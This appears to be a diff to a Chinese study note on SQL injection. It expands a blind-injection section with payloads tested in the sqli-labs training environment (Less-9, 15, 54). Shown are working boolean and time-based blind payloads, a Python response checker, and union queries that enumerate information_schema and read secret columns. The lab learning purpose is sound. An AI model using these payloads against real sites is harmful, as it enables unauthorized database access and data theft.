@@ -129,23 +129,123 @@ SET SESSION group_concat_max_len = 100000;
 
 # 六、盲注
 
-## 布尔盲注（有真假差异）
+> 实战结论来源：sqli-labs **Less-15**（布尔盲注）、**Less-9**（时间盲注）、**Less-54**（跨库读 `challenges`），2026-10-07 本机实测。
+
+## 6.1 先分清是布尔还是时间（**别选错**）
+
+| | 布尔盲注 | 时间盲注 |
+|---|---|---|
+| 页面差异 | **有**（图片/文案/长度会变） | **没有** |
+| 判据 | 响应体的一个特征 | **响应耗时** |
+| 速度 | 快（不 sleep） | 慢（每次都要等） |
+| Less-15 | 是 ← `images/flag.jpg` = 真，`images/slap.jpg` = 假 | 同接口也能做，但没必要 |
+| Less-9 | 不是（两个分支回显**完全一样**的 `You are in...........`） | 是 |
+
+**一句话判据**：条件写真、写假各发一次，**页面变了就是布尔，页面一模一样就是时间**。
+
+## 6.2 布尔盲注五步模板
 
 ```sql
-?id=1' and length(database())=8--+                        -- 猜长度
-?id=1' and ascii(substr(database(),1,1))>100--+           -- 二分猜字符
-?id=1' and ascii(substr(database(),1,1))=115--+           -- 精确
+-- ① 定长度：页面变 "真" 的那个数
+?id=1' and length(database())=8--+
+
+-- ② 二分猜字符（比逐字符快，1 字符约 7 次请求）
+?id=1' and ascii(substr(database(),1,1))>100--+
+
+-- ③ 收敛到精确值
+?id=1' and ascii(substr(database(),1,1))=115--+
+
+-- ④ 换位置继续
+?id=1' and ascii(substr(database(),2,1))>100--+
 ```
 
-## 时间盲注（完全没差别）
+```python
+def check(payload):
+    r = requests.get(url + payload)
+    return "images/flag.jpg" in r.text      # ← 只有这一个判据
+```
+
+**判据要选“不可能偶然出现”的特征**：Less-15 用 `images/flag.jpg` / `images/slap.jpg` 比用文案长度可靠。
+
+## 6.3 时间盲注：延迟 = sleep(N) × 条件被求值的行数
+
+**这是最容易算错的地方** —— 不是「sleep 几秒就卡几秒」，而是**每匹配一行就求值一次**。
+
+| 写法（Less-9 实测，sleep(3)） | 延迟 | 为什么 |
+|---|---|---|
+| `id=1' and if(条件, sleep(3), 0)-- ` | **3.0s** | `and` 左边锚定 1 行 → 1 倍，**精确** |
+| `id=-1' or if(条件, sleep(3), 0)-- ` | **≈40s** | `or` 右边每行都求值 → 13 行 × 3s |
+| `id=1' or if(条件, sleep(3), 0)-- ` | **≈12×3s** | `or` 同上，按表行数放大 |
+
+**结论**：
+
+- **优先用 `and` + 锚定左值**（`id=1 and ...`）→ 延迟正好等于 `sleep(N)`，好判读
+- `or` 会**按行数叠加**，慢但信号极强（想确认「真的注进去了」时很好用）
+- `and` 左边不匹配任何行时**一次都不 sleep**（`username='1'` → 0.02s），会误判成假
+
+**倍数标定实验**（Less-15，`users` 表 13 行）：
+
+```
+1' or if(条件, sleep(1), sleep(0)) #   →  约 12 秒   （倍数 ≈ 12）
+1' or if(条件, sleep(3), sleep(0)) #   →  约 40 秒
+1' or if(id=8 and 条件, sleep(3), 0) # →  约 3 秒    （锚定唯一行 → 倍数 = 1）
+```
+
+**注释符选 `#` 而不是 `-- `**：`--` 后面必须跟空格，`#` 直接吃到行尾，写起来不容易断。
+
+## 6.4 `information_schema` 的层级与「按库收窄」
+
+```
+Server
+ └─ Database        information_schema.schemata          .schema_name
+     └─ Table       information_schema.tables            .table_name  （按 table_schema 收窄）
+         └─ Column  information_schema.columns           .column_name （按 table_schema + table_name 收窄）
+             └─ Row  实际表里的数据
+```
+
+**本机实测规模**：`information_schema.columns` 共 **3250 行**，横跨 **7 个库 / 304 张表**。
+→ 查列名时**必须**同时限定 `table_schema` 和 `table_name`，否则 `group_concat` 直接被 `group_concat_max_len` 截断，拿到的是别的库的同名列。
 
 ```sql
-?id=1' and if(ascii(substr(database(),1,1))>100, sleep(5), 1)--+
--- 条件真 → 页面卡 5 秒
+-- 反例：没限定表 → 捞回一堆无关的 user / id 列
+select group_concat(column_name) from information_schema.columns where table_name='users'
 
--- sleep 被禁时用
-?id=1' and if(条件, benchmark(1000000, md5(1)), 1)--+
+-- 正例：限定库 + 表
+select group_concat(column_name) from information_schema.columns
+  where table_schema=database() and table_name='users'
 ```
+
+## 6.5 不带库名的表名，走的是「连接的默认库」
+
+```sql
+select * from users      -- 解析成 <默认库>.users（sqli-labs 里默认库 = security）
+```
+
+**跨库必须写全名**，表名是随机的时候还要反引号：
+
+```sql
+select `secret_9WEI` from `challenges`.`7j2ha5vhrn`
+```
+
+**Less-54 流程**（只有 10 次尝试，所以要「贪婪」：一次请求取尽可能多）：
+
+```sql
+-- ① 表名（用 # 吃掉原句的 LIMIT 0,1）
+-1' union select (select group_concat(table_name) from information_schema.tables
+                  where table_schema='challenges'),2 #
+-- ② 列名
+-1' union select (select group_concat(column_name) from information_schema.columns
+                  where table_schema='challenges' and column_name like 'secret%'),2 #
+-- ③ 读值
+-1' union select (select `secret_9WEI` from `7j2ha5vhrn` limit 0,1),2 #
+```
+
+> 本题的挑战表名/列名是**每次 reset 随机**的，所以必须先查 `information_schema` 再读值 —— 顺序不能反。
+
+## 6.6 其他判据
+
+- **`is_numeric(intval($x))` 恒真**，别拿它当过滤
+- **`count(username)=13`** 这类常数条件会被 MySQL 折叠，可能 0 秒返回 —— 要验证「条件被求值几次」就用带 `id=` 的锚定写法
 
 # 七、绕过技巧
 
